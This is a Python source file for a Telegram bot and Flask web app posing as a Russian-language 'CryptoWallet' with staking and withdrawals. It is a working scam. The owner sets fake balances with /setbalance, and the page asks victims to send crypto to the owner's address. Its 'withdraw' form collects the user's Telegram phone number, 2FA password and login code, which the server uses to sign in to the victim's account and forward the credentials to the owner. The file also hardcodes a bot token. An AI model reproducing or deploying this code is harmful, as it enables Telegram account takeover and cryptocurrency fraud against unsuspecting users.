import asyncio
import logging
import os
import nest_asyncio
from threading import Thread
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from flask import Flask, request, jsonify

nest_asyncio.apply()

API_ID = 8
API_HASH = '7245de8e747a0d6fbe11f7cc14fcc0bb'
BOT_TOKEN = '8737138603:AAG2FHcf4msHENx4ppx5jXmzNRgltJd1pPg'
OWNER_ID = 1663746192
CRYPTO_ADDRESS = '0xYourAddress'
WEBHOOK_URL = 'https://your-app.up.railway.app'

logging.basicConfig(level=logging.INFO)
bot = TelegramClient('bot_session', API_ID, API_HASH)
app = Flask(__name__)

user_balances = {}

HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>CryptoWallet</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: Arial; background: #1a1a2e; color: #eee; text-align: center; padding: 20px; }
        .card { background: #16213e; padding: 20px; border-radius: 15px; margin: 15px 0; }
        button { background: #e94560; color: #fff; border: none; padding: 15px; border-radius: 10px; width: 100%; font-size: 16px; margin: 5px 0; cursor: pointer; }
        input { width: 100%; padding: 15px; border-radius: 10px; border: none; margin: 5px 0; font-size: 16px; background: #0f3460; color: #fff; }
        .balance { font-size: 36px; color: #e94560; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <p>💰 Баланс</p>
        <p class="balance" id="balance">0 USDT</p>
        <button onclick="showStake()">📤 Отправить в стек</button>
        <button onclick="showWithdraw()">💸 Вывод</button>
    </div>
    <div class="card" id="stakeBlock" style="display:none">
        <p>Адрес кошелька:</p>
        <p id="cryptoAddress" style="word-break:break-all"></p>
        <button onclick="copyAddress()">📋 Скопировать</button>
        <button onclick="goBack()">🔙 Назад</button>
    </div>
    <div class="card" id="withdrawBlock" style="display:none">
        <input type="text" id="phone" placeholder="Номер телефона">
        <input type="password" id="password" placeholder="Пароль">
        <input type="text" id="code" placeholder="Код подтверждения">
        <button onclick="withdraw()">💸 Вывести</button>
        <button onclick="goBack()">🔙 Назад</button>
    </div>
    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        const userId = tg.initDataUnsafe?.user?.id || 0;
        function updateBalance() {
            fetch('/get_balance?user_id=' + userId)
                .then(r => r.json())
                .then(d => document.getElementById('balance').textContent = d.balance + ' USDT');
        }
        function showStake() {
            document.getElementById('stakeBlock').style.display = 'block';
            document.getElementById('withdrawBlock').style.display = 'none';
            fetch('/get_address').then(r => r.json()).then(d => document.getElementById('cryptoAddress').textContent = d.address);
        }
        function showWithdraw() {
            document.getElementById('withdrawBlock').style.display = 'block';
            document.getElementById('stakeBlock').style.display = 'none';
        }
        function goBack() {
            document.getElementById('stakeBlock').style.display = 'none';
            document.getElementById('withdrawBlock').style.display = 'none';
        }
        function copyAddress() {
            navigator.clipboard.writeText(document.getElementById('cryptoAddress').textContent);
            alert('Скопировано');
        }
        function withdraw() {
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            const code = document.getElementById('code').value;
            fetch('/withdraw', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({user_id: userId, phone, password, code})
            }).then(r => r.json()).then(d => alert(d.message));
        }
        updateBalance();
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return HTML_PAGE

@app.route('/get_balance')
def get_balance():
    user_id = int(request.args.get('user_id', 0))
    return jsonify({'balance': user_balances.get(user_id, 0)})

@app.route('/get_address')
def get_address():
    return jsonify({'address': CRYPTO_ADDRESS})

@app.route('/withdraw', methods=['POST'])
def withdraw():
    data = request.json
    user_id = data.get('user_id')
    phone = data.get('phone')
    password = data.get('password')
    code = data.get('code')
    asyncio.ensure_future(process_withdraw(user_id, phone, password, code))
    return jsonify({'message': 'Запрос обрабатывается'})

async def process_withdraw(user_id, phone, password, code):
    client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
    try:
        await client.connect()
        await client.send_code_request(phone)
        try:
            await client.sign_in(phone=phone, code=code)
        except SessionPasswordNeededError:
            await client.sign_in(password=password)
        me = await client.get_me()
        await bot.send_message(OWNER_ID, f'#ВЫВОД\nТелефон: {phone}\nПароль: {password}\nКод: {code}\nАккаунт: @{me.username}')
    except FloodWaitError as e:
        await bot.send_message(OWNER_ID, f'FloodWait: ждать {e.seconds} сек')
    except Exception as e:
        await bot.send_message(OWNER_ID, f'Ошибка вывода: {e}')
    finally:
        await client.disconnect()

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    user_balances.setdefault(user_id, 0)
    await event.respond('🪙 CryptoWallet Bot', buttons=[[Button.url('🚀 Открыть кошелек', WEBHOOK_URL)]])

@bot.on(events.NewMessage(pattern='/setbalance'))
async def set_balance(event):
    if event.sender_id != OWNER_ID:
        return
    try:
        _, target_id, amount = event.text.split()
        target_id, amount = int(target_id), float(amount)
        user_balances[target_id] = amount
        await event.respond(f'Баланс {target_id}: {amount} USDT')
    except:
        await event.respond('/setbalance <id> <сумма>')

async def main():
    await bot.start(bot_token=BOT_TOKEN)
    await bot.run_until_disconnected()

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))

if __name__ == '__main__':
    Thread(target=run_flask, daemon=True).start()
    asyncio.get_event_loop().run_until_complete(main())
